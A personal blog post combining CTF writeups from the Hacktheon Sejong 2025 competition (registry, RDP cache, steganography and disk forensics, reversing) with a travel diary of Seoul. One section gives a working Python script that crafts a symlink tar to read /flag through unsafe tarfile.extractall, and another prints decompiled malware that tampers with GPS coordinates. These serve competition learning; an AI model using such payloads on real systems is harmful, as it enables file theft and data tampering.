---
title: "Hackathon Sejong & Korea Trip"
description: "My trip to Korea and final on Hackathon Sejong 2025"
summary: "My trip to Korea and final on Hackathon Sejong 2025"
categories: ["Blogs"]
tags: ["Reverse", "Forensic", "Writeup", "Blogs"]
#externalUrl: ""
date: 2025-07-14
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/hackathon_sejong2025.png
---


Welcome to the recap of our journey at **Hacktheon Sejong 2025**. This blog covers the technical writeups of the challenges we solved during the competition, followed by a photo diary of our memorable trip to South Korea.

Our journey began at **Tan Son Nhat (SGN)** to **Incheon (ICN)** on a flight lasting approximately 5 hours. We flew with **Vietjet Air**,  an airline notorious for delays but popular for its budget-friendly fares compared to other carriers. We were quite lucky, the flight was only delayed by 30 minutes

The food on Vietjet is very familiar. I had spaghetti with tomato sauce and cashews for dessert

![Flight Photo 2](/images/hackathon-korea/food-vj.png)

 During the flight, I reviewed the timeline, mentally preparing myself for what was coming

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/timeline1.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/timeline2.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


As soon as we got off the plane, we just followed the signs to get to immigration. I have to say, Incheon Airport is absolutely massive and super modern, but you really can't get lost, there are arrows pointing you everywhere.

**Just a heads-up regarding immigration:** It can be pretty strict. You have to fill out an arrival card with details like where you're staying, your purpose of visit, how long you'll be there….

> *Do yourself a favor and fill this form out while you're still on the plane. Trust me, you do not want to be standing there filling out paperwork while the line gets longer!*
> 

![Flight Photo 1](/images/hackathon-korea/korea7.png)

Taxi Grab in Korea are expensive, so the subway and bus are the way to go. We decided to bought a **T-Money card** right away so we wouldn't have to deal with buying single tickets every time we moved.

- *The card itself is 4000 KRW, can find them at any convenience store like **GS25, CU, etc** or even right there at the airport vending machines.*

- *Sim card i bought it in VietNam to save money*
 

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/tmoney.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/sim.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


Okay, you bought the card, now how do you put money on it? 

If you buy these cards at convenience stores, you can ask the staff to top up your account directly after purchasing the card. Otherwise, you have to find "Ticket Vending and Card Reload" machines at every subway station (It have an **English** language button)

Here’s a quick breakdown of the machine layout so you don't look confused like I did at first:

- **The Red Slot (Left):** This is where you place your card. Once you put it there, the screen will pop up showing your current balance and ask how much you want to add.
- **The Yellow Slot (Middle):** This is for coins money
- **The Black Slot (Right):** This is for paper money

![naptienbus.png](/images/hackathon-korea/naptienbus.png)

When place your card in the Red spot. You can select the amount on the screen (Minimum: **1,000 KRW) and i**nsert your cash into the corresponding slot.

> *Just like vending machines, these machines are **super picky** about the quality of your bills.
Make sure your cash is **crisp and flat**. If your bill is wrinkled or old, the machine will spit it back out at you repeatedly. Save yourself the awkwardness and smooth out your money before feeding it in 😅*
> 

![pricebus.png](/images/hackathon-korea/pricebus.png)

7000KRW ~ 2,3 days 

## Writeup of Competition

Here are the detailed solutions Forensic & Reverse challenges, i solved during the competition.

### Shadow Of The System

![sots_chall.png](/images/hackathon-korea/sots_chall.png)

Analyze the provided `SYSTEM` registry hive to find the flag

![system.png](/images/hackathon-korea/system.png)

![file_check.png](/images/hackathon-korea/file_check.png)

This revealed that it was a **Windows Registry File**. To analyze it properly, I decided to use **Registry Viewer**, a tool designed for exploring Windows registry files.

![ftk.png](/images/hackathon-korea/ftk.png)

Since registry files typically contain **huge amounts of keys and directories**, manually browsing through them would have been inefficient.

I recalled that the challenge hinted at “**backdoor**” activity, so I used the search function (Ctrl + F) in Registry Viewer and searched for the keyword “backdoor”.

![bd.png](/images/hackathon-korea/bd.png)

Surprisingly, this immediately led me to a suspicious service entry.

![checkhxd.png](/images/hackathon-korea/checkhxd.png)

You can use method 2:

utilized **RegRipper3.0** (available on [GitHub](https://github.com/keydet89/RegRipper3.0)) to analyze the `SYSTEM` file. I exported the results to a text file named `SYSTEM_full_output.txt`

![regripper.png](/images/hackathon-korea/regripper.png)

Inside the output file, I performed a text search for suspicious keywords such as `services`, `cmd.exe`, and `powershell.exe`

![txt.png](/images/hackathon-korea/txt.png)

Upon filtering through the results, I located the flag hidden within a service entry.

**> FLAG:** `FLAG{8yp455_u4c_g37_5y5t3m}`

### Watch

![watchchall.png](/images/hackathon-korea/watchchall.png)

The challenge specifies that we had to retrieve the string that was written in Notepad during an RDP session. Provided by the challenge are two files: `Cache0000.bin` and `bcache24.bmc`. These files are related to **RDP cache storage**.

![bmc.png](/images/hackathon-korea/bmc.png)

I used [bmc-tools](https://github.com/ANSSI-FR/bmc-tools) to extract and reconstruct RDP cache images. After cloning the repository, I ran the script to extract the bitmap images from the provided cache file.

![BMC Tools Command](/images/hackathon-korea/bmctool.png)

After extracting the images, I manually scrolled through the output folder. I eventually found a screenshot of a Notepad window containing the flag.

![Notepad Screenshot](/images/hackathon-korea/outbmc.png)

![flagbmc.png](/images/hackathon-korea/flagbmc.png)

> **FLAG:** `FLAG{s0m3on3_1s_w4tch1n9_my_pc}`

### Hidden Message

![hmchall.png](/images/hackathon-korea/hmchall.png)

The challenge provided an image called Hidden Message.png. At first glance, nothing unusual stood out visually. Since the challenge mentioned something "hidden," I suspected **steganography**

![challhm.png](/images/hackathon-korea/challhm.png)

I analyzed the provided image using `zsteg`. The analysis revealed that there was another PNG file hidden in the `b1,rgb,lsb,xy` channel.

![Zsteg Analysis](/images/hackathon-korea/zsteg.png)

I extracted the hidden PNG file using the following payload:

![Zsteg Extract Command](/images/hackathon-korea/zsteg_out.png)

Opening the extracted image revealed the flag:

![Hidden Flag Image](/images/hackathon-korea/flaghm.png)

> **FLAG:** `FLAG{St3gan09raphy_15_Eazy~~!!}`

### Nothing Is Essential

![nie.png](/images/hackathon-korea/nie.png)

Analyze a disk image to find a meeting time.

![niechall.png](/images/hackathon-korea/niechall.png)

We were given a `.ad1` image file. I opened it in **FTK Imager** to analyze the file structure. After browsing through the directories, the `AppData` folder seemed to contain the most relevant user data. I dug deeper and found a message in Notepad++ metadata:

![Notepad++ Message](/images/hackathon-korea/nieftk.png)

I initially suspected this file might contain the meeting date, but it only revealed a time fragment ending at `5:??`. This led me to explore other text-based applications.

While investigating the **OneNote** folder, I discovered two SQLite3 database files that seemed promising for storing notes and schedules. I extracted both for further analysis.

![OneNote DB Extraction](/images/hackathon-korea/ftkana.png)

I opened the `.db` files in a text editor (or SQLite Browser) and searched for keywords like `meeting`, `date`, `time`, and `schedule`. Finally, searching for the keyword **"meet"** in `notes.sdk_b193c846-2e04-40da-a8ed-1628569cfbd9.db` revealed the flag.

![OneNote Content](/images/hackathon-korea/sche.png)

> **FLAG:** `FLAG{2025/03/14_17:40}`

### I Love Reversing

Analyze the `infect.exe` malware.

1. **Static Analysis:** I ran **DiEC** (Detect It Easy) on `infect.exe`.

![DiEC Scan](/images/hackathon-korea/ilr.png)

The output confirmed the binary was compiled with Python and packed using **PyInstaller**.

1. **Extraction:** To reverse engineer it, I used **pyinstxtractor** (available [here](https://github.com/extremecoders-re/pyinstxtractor)) to extract the contents.

![Pyinstxtractor](/images/hackathon-korea/pyinstxtractor.png)

This generated a directory named `infect.exe_extracted` containing `infect.pyc`.

1. **Decompilation:** I uploaded `infect.pyc` to **PyLingual** (an online Python decompiler) to reconstruct the source code.

![pyinstxtractor_out.png](/images/hackathon-korea/pyinstxtractor_out.png)

**Decompiled Source Code:**

![pylingual.png](/images/hackathon-korea/pylingual.png)

```python
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

def infect(location_data):
    location_data['latitude'] += 2.
    location_data['longitude'] += 2.
    return location_data

@app.route('/location_data', methods=['POST'])
def location_data():
    location_data = request.json
    print('Received data from attack instruction PC:', location_data)
    location_data = infect(location_data)
    url = '<http://192.168.101.101:4653/location_data>'
    response = requests.post(url, json=location_data)
    print('Response from ship node:', response.text)
    return jsonify({'message': 'Data forwarded to ship node successfully!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4653)

```

**Analysis:** The script runs a Flask web server acting as malware. It accepts JSON payloads via POST requests. The `infect` function modifies the input data by adding values to the GPS coordinates. Based on the challenge context, the specific value added was `2.593627`.

> **FLAG:** `FLAG{2.593627}`

### TAR

Exploiting tarfile handling in Python.

**Vuln Analysis:** The challenge provided a `tar.py` source code which allows users to upload a Base64 encoded tar file. The script extracts the file without checking for symbolic links (symlinks).

The vulnerable code section:

```python
with tarfile.open(fileobj=tar_bytes, mode='r') as tar:
    tar.extractall(path=extract_dir_path)

```

`tar.extractall` is vulnerable because it blindly trusts paths in the tar archive. We can exploit this by creating a symlink in the tar file that points to the `/flag` file on the server.

**Exploit Script:** I wrote a Python script to generate the malicious payload:

```python
import tarfile
import base64
import os

# Create a symlink pointing to the flag
os.symlink('/flag', 'flag_link')

# Add the symlink to a tar file
with tarfile.open('exploit.tar', 'w') as tar:
    tar.add('flag_link')

# Read and encode the tar file to Base64
with open('exploit.tar', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode()

print(encoded)

```

I ran the script, obtained the Base64 string, and pasted it into the challenge's netcat session.

![payload.png](/images/hackathon-korea/payload.png)

> **FLAG:** `FLAG{53f81c237b8466628a65ed9a0999aff8}`

### Barcode

Reverse an ASCII art generator to find the input hex.

I started by analyzing the binary in IDA Pro.

![ida.png](/images/hackathon-korea/ida.png)

The binary generates an ASCII pattern based on a hexadecimal input. The flag is `flag.barcode`. The goal is to reverse the generation process to recover the original hex input.

**Function Logic:**

- `sub_18F0` (Bit to ASCII): Converts a 64-bit integer into an 8x8 binary pattern.
- `sub_2650` (Matrix Transpose): Transposes the 8x8 bit matrix (rows become columns).
- `sub_2850` (Pattern Printing): Prints the matrix: 0 becomes a space, non-zero becomes .
- `sub_12E0` (Hex Processing): Parses the input hex string.

**Solver Script:** I wrote a Python script to reverse the bit manipulation and XOR operations:

```python
def matrix_to_hex(matrix_lines):
    if len(matrix_lines) != 8:
        raise ValueError("Need 8 rows.")

    binary_str = ""
    for row in matrix_lines[::-1]:  # x-axis flip (vertical)
        # Add y-axis flip by reversing each row
        flipped_row = row[::-1].ljust(8)
        binary_row = ''.join(['1' if c == '*' else '0' for c in flipped_row])
        binary_str += binary_row
    return int(binary_str, 2)

def calculate_inputs(output_values):
    inputs = []
    cumulative_xor = 0
    for i, out in enumerate(output_values):
        if i == 0:
            inputs.append(out)
            cumulative_xor = out
        elif i == 1:
            inputs.append(~out ^ cumulative_xor)
            cumulative_xor ^= out
        else:
            inputs.append(out ^ cumulative_xor)
            cumulative_xor ^= ~out
    return inputs

# The ASCII art blocks from the flag.barcode file
blocks = [
    [ # Block 1
        "        ", " ****** ", " *    * ", " ****** ", " *    * ", " *    * ", " *    * ", "        ",
    ],
    [ # Block 2
        "        ", " *    * ", " *    * ", " *    * ", " *    * ", " *    * ", " ****** ", "        ",
    ],
    [ # Block 3
        "        ", "  ****  ", " *    * ", " ****** ", " *    * ", " *    * ", " *    * ", "        ",
    ],
    [ # Block 4
        "        ", "  ****  ", " *    * ", " *      ", " * ***  ", " *    * ", "  ****  ", "        ",
    ]
]

output_values = [matrix_to_hex(block) for block in blocks]
input_values = calculate_inputs(output_values)
combined_hex = ''.join(f"{x & 0xFFFFFFFFFFFFFFFF:016x}" for x in input_values)

print(f"Final input hex string: 0x{combined_hex}")

```

Running the script gave us the final flag.

![solvescript.png](/images/hackathon-korea/solvescript.png)

![flag_bc.png](/images/hackathon-korea/flag_bc.png)

**> FLAG:** `FLAG{0x000202027e027e00ff83ffff83ff83ff003e424202424000fffdffcfffff83ff}`

### **Competition View**

Banner

![GvdSSn7XoAEpctE.jpg](/images/hackathon-korea/GvdSSn7XoAEpctE.jpg)

I went into the competition feeling relax..

<div style="margin: 20px 0;">
  
  <div style="display: flex; gap: 15px; justify-content: space-between;">
    <div style="flex: 1;">
      <img src="/images/hackathon-korea/view.png" 
           style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
           alt="View 1">
    </div>
    <div style="flex: 1;">
      <img src="/images/hackathon-korea/view2.png" 
           style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
           alt="View 2">
    </div>
  </div>

  <div style="text-align: center; margin-top: 10px; font-weight: bold; font-style: italic; color: #a4b688;">
    hardcore vibes 🥵
  </div>

</div>

After spending two days in Competition, I chose to stay in South Korea for two more days and travel to Seoul for sightseeing

## Korea Trip 🇰🇷

The Korean organizers were incredibly helpful, providing all the necessary documents for our visa applications, which made the process much smoother. We managed to finalize all the paperwork just in the nick of time, ready to pack our bags and head to Sejong.

### Nice to CU

The convenience store that seems to be absolutely *everywhere* here is **Nice to CU**. Honestly, stepping inside felt pretty familiar, the vibes is almost identical to the GS25 in Vietnam

![ntcu.png](/images/hackathon-korea/ntcu.png)

They stock some unique and quirky items that caught my eye


<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/517380847_1121504399950358_1888092869642683642_n.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/518277240_1121504299950368_8628958324046861434_n.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

I like soju, but it’s strong, so it’s best to drink it with non-alcoholic sweet drinks

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/faker_mi.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/519426706_1121504446617020_984301684003762754_n.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


I decided to try the famous **Banana Milk** since everyone says it's a total "must-try" when in Korea. I took my friend's advice and tried mixing banana milk with Americano... and wow, it tasted really good!!

![drink_ntcu.jpg](/images/hackathon-korea/drink_ntcu.jpg)

Let me tell you... I got *hooked* immediately. I’m not even joking, it was so good that I actually ran back out late at night just to grab another 🤣

![bnnmilk.png](/images/hackathon-korea/bnnmilk.png)

### Myeongdong Night Market

This is one of the busiest and most famous districts in Seoul [[Location]](https://maps.app.goo.gl/ttCdC1n7ZFDpJThw6) It's a stretch of about 500m that perfectly blends the super modern, bustling city vibe with that traditional Korean charm, the street food and specific dishes you tried like lobsters, egg bread, etc.)

![myeongdong.png](/images/hackathon-korea/myeongdong.png)

Walking through here feels like entering a maze of skincare and cosmetics, there are literally hundreds of shops! Whether you're hunting for affordable fashion, high-end brands, K-Pop merch…

![shoppinghall.png](/images/hackathon-korea/shoppinghall.png)

Additionally, Myeongdong is well-known for its diverse street food, including spicy rice cakes (tteokbokki), Korean fried chicken, and fish-shaped pastries (bungeoppang)

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea1.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea4.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


The energy here is just unmatched. It’s always packed and lively, often with random street performances happening right in front of you. What I loved most were the people, especially the food stall owners. You can really feel their passion and sincerity, which creates such a vibrant and colorful atmosphere that makes you want to stay forever.

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea2.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea3.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


The district also houses major shopping malls and duty-free stores, attracting millions of visitors each year. Moreover, Myeongdong Cathedral, a significant historical site, is also located in this area.

I was really full and finished with a fantastic glass of lemonade at the end of the road.

Our trip to Seoul after two days in Sejong, we decided to stay in here for another two days 

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea9.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/st.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

<details style="background-color: rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 15px; margin: 20px 0; border-left: 4px solid #4A5D23;">
  
  <summary style="cursor: pointer; font-weight: bold; font-size: 1.1em; outline: none; list-style: none;">
    💡 Tips Booking & Transport (Click here)
  </summary>
  
  <div style="margin-top: 15px; font-style: italic; color: #d0d0d0; line-height: 1.6;">
    <p>
      You can easily book great places on 
      <a href="https://www.airbnb.com/" target="_blank" style="color: #a4b688; font-weight: bold; text-decoration: underline;">Airbnb</a>. 
      There are plenty of options ranging from budget to high-end.
    </p>
    <p>
      Must download 
      <a href="https://map.naver.com/p/" target="_blank" style="color: #a4b688; font-weight: bold; text-decoration: underline;">Naver Map</a> 
      immediately, Google Maps doesn't show detailed walking directions or specific road details in Korea. Naver Map is what the locals use, it’s infinitely more accurate and detailed. Trust me =]]
    </p>
  </div>

</details>

   
### Starfield Coex Mall

As a massive book lover, there was no way I was leaving Seoul without visiting the most famous library in the country is [**Starfield Library**](https://maps.app.goo.gl/PMdnFbVrhyjdUEG88), located right inside the COEX Mall.

And wow... "huge" doesn't even begin to cover it. It is absolutely majestic. I stood there completely awestruck, my jaw practically hit the floor! Apparently, there are over **50,000 books and magazines** here, all neatly stacked on these insane shelves that tower up to **13 meters high**.

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/starfield_library.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/starfield_library2.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


You can just grab any book you want and start reading, no librarians, no checkout counters, it's all based on the honor system. I saw tons of young locals actually studying and reading there. As for us tourists? Well, since most of the books are in Korean, we were mostly there for the Gram and to soak in the vibes (let's be real, I can't read a word of it anyway)

Since it was super crowded, I mainly focused on getting those iconic check-in shots.

> *P/s: If you do want to read but don't know Korean, the library actually provides **iPads**! You can use them to translate content or read e-books in your preferred language.*
> 

### Gwanghwamun

Next up, we headed to [**Gwanghwamun**](https://maps.app.goo.gl/ctGF8bH9JBGwm4gv5). I *cannot* skip this place - it is iconic

You should try to time your visit perfectly to see the **Royal Changing of the Guard**. It's definitely worth checking the schedule beforehand because it's a truly spectacular sight! I couldn't make it because I was running late.

![Gwanghwamun Palace](/images/hackathon-korea/korea18.png)

The complex is massive with so many different sections. I haven't dug too deep into the history books, but one thing that stood out was the giant statue of **King Sejong** right in the middle of the square. I learned that he’s a legendary figure from the Joseon Dynasty, basically the "Great King" who invented **Hangul** (the Korean alphabet we see everywhere today)

![vuasejong.png](/images/hackathon-korea/vuasejong.png)

The ticket costs **3000 KRW,** but if you wear a [**Hanbok**](https://en.wikipedia.org/wiki/Hanbok) (traditional Korean clothing), you get in for free. Anyway, renting a hanbok is more expensive than the entrance fee

### T1 Base Camp

If you are a LoLs fan, specifically a T1 or Faker fan, this place is essentially holy ground. Located just a short walk from **Hongdae Station**

![korea21.png](/images/hackathon-korea/korea21.png)

> Seoul’s subway system is huge (9 main lines!) and can honestly be a bit overwhelming at first glance.
> 
> - *To get to T1 Basecamp smoothly, just hop on **Line 2**. It’s the **Green Line** on the map.*
> - *Definitely have an updated subway map or a reliable app handy to check the schedule.*

![LoL Park Entrance](/images/hackathon-korea/seoul_metro_line.jpg)

T1 Basecamp is a massive **854-square-meter** PC Bang completely decked out in T1’s signature colors: Red, White, and Black

![t1_tower.png](/images/hackathon-korea/t1_tower.png)

The whole vibe screams "Faker" and T1 legacy. You’ll see huge portraits of the top pro players along with their names plastered all around the venue. 

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/t1_net.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/t1_inside.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


Apparently, T1 teamed up with **SuperPlay -** a local Korean gaming lifestyle brand to design this entire space, and they did an incredible job creating a unique experience that’s way more than just a place to play games

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/t1-in.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/t1111.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>


### Street & Food

I just want to drop a few random photos I took while walking around. Here are a few of my random favorite street corners:

![korea23.png](/images/hackathon-korea/korea23.png)

streets
<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea14.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea20.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

rainbow
![korea17.png](/images/hackathon-korea/korea17.png)

souvenir shop
![korea6.png](/images/hackathon-korea/korea6.png)

streets in alleys
![korea5.png](/images/hackathon-korea/korea5.png)

photobooth
![korea27.png](/images/hackathon-korea/korea27.png)

Honestly, you don't even need to go to famous tourist spots to find beauty here. Just wandering down a random street feels like being in a movie scene. Everything is super clean, organized, and has this really peaceful, cinematic vibes..

![korea26.png](/images/hackathon-korea/korea26.png)

![korea30.png](/images/hackathon-korea/korea30.png)

Of course, with a "foodie soul" like mine, there is no way I could finish this blog without talking about the food! 🤤
My impression of Korean food is that it's quite spicy and bland (probably because I'm used to Vietnamese food)

The traditional spicy rice cakes paired with fried chicken are a match made in heaven
![fooood.jpg](/images/hackathon-korea/fooood.jpg)

Even a basic lunch with Kimchi and side dishes felt very hearty
![lunch.jpg](/images/hackathon-korea/lunch.jpg)


We went to a local BBQ spot and the owner was incredibly friendly. The moment he found out we were from Vietnam, he actually **gifted us an extra serving of meat** on the house! He was so adorable. Thank you so much, uncle! ❤️

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/516292897_1121504863283645_6811244239143569945_n.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/518367177_1121505623283569_6106613725449056297_n.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

Can u see VietNam food? I'm starting to feel homesick
![korea13.png](/images/hackathon-korea/korea13.png)

‘Nice to meat you” =)))))
![korea37.png](/images/hackathon-korea/korea37.png)

<details style="background-color: rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 15px; margin: 20px 0; border-left: 4px solid #4A5D23;">
  
  <summary style="cursor: pointer; font-weight: bold; font-size: 1.1em; outline: none; list-style: none;">
    The Deeper Meaning of "Annyeonghaseyo" (Click here)
  </summary>
  
  <div style="margin-top: 15px; font-style: italic; color: #d0d0d0; line-height: 1.6;">
    <p>
      Did you know that the standard Korean greeting "안녕하세요" (Annyeonghaseyo) is grammatically a question? That's why you often see it written with a question mark (?)
    </p>
    <p>
      The word "Annyeong" (안녕) comes from Hanja (Chinese characters) and literally means "peace", "safety" or "well-being". In the past, during times of constant war and instability, just surviving the night was considered a blessing. So when people met in the morning, they wouldn't just say a casual "hi". Instead, they would anxiously ask: "Did you stay safe through the night?" (밤새?) or "Did you sleep peacefully?" (안녕히 주무셨습니까?)
    </p>
    <p>
      Over time, these phrases were shortened into the "안녕하세요" we use today. So essentially, it’s not just a meaningless greeting. It is a genuine inquiry wishing for the listener's peace and safety^^
    </p>
  </div>
</details> 

On our very last night, a close *hyung* of mine who lives in Korea invited me out for a special dinner. We had a massive **Seafood feast** accompanied by traditional **Makgeolli** (rice wine).

Honestly, for a student like me, this was a truly luxurious experience. It was the perfect way to end the trip. *Thank you so much for the warm welcome and this amazing treat!* 

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/korea10.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/yooooo.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

<details style="background-color: rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 15px; margin: 20px 0; border-left: 4px solid #4A5D23;">
  
  <summary style="cursor: pointer; font-weight: bold; font-size: 1.1em; outline: none; list-style: none;">
    Korean culture (Click here)
  </summary>
  
  <div style="margin-top: 15px; font-style: italic; color: #d0d0d0; line-height: 1.6;">
    <p>
      Koreans don't like being filmed or photographed, so keep this in mind when traveling there. 
    </p>
    <p>
      One small but interesting cultural detail I noticed right away is how people behave on **escalators** here. You’ll see everyone instinctively standing on the **right side**, leaving the **left side** completely open. The culture here is to keep the left lane strictly reserved for people who are in a rush and need to walk or run up. So, if you're chilling and not in a hurry, make sure to stick to the right, or you might accidentally block someone sprinting to catch their train!
    </p>
  </div>
</details> 

I feel lucky that I didn't get into any fights or encounter any difficult people, everything went smoothly ^^

## The End

This was truly an unforgettable experience during my university years. I want to sincerely thank my parents for their support and for giving me the opportunity to join this competition – an amazing journey that helped me learn, experience a new culture, and grow as a person.

I'm also incredibly grateful to my wonderful teammates and to the Hackathon Sejong organizers for making everything run smoothly and creating such memorable moments.

This trip was especially meaningful because I finally got to meet friends and brothers I'd only known online before not in Vietnam it’s Korea, which made it even more special. I was particularly impressed by Korea's beautiful scenery, rich culture, and historical landmarks. The local food was delicious, and I felt genuinely welcomed by the people there, which left a lasting impression on me.

I truly fell in love with Korea and hope to return one day to reconnect with all the amazing people I met on this journey.

<div style="display: flex; gap: 15px; margin: 20px 0;">
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/viewplane.png" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
  <div style="flex: 1;">
    <img src="/images/hackathon-korea/medal.jpg" 
         style="width: 100%; height: auto; border-radius: 12px; object-fit: cover; display: block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);" 
         alt="...">
  </div>
</div>

감사합니다 🇰🇷 , 또 만나요 !

Thank you for taking the time to read my blog and for joining me on this memorable adventure❤️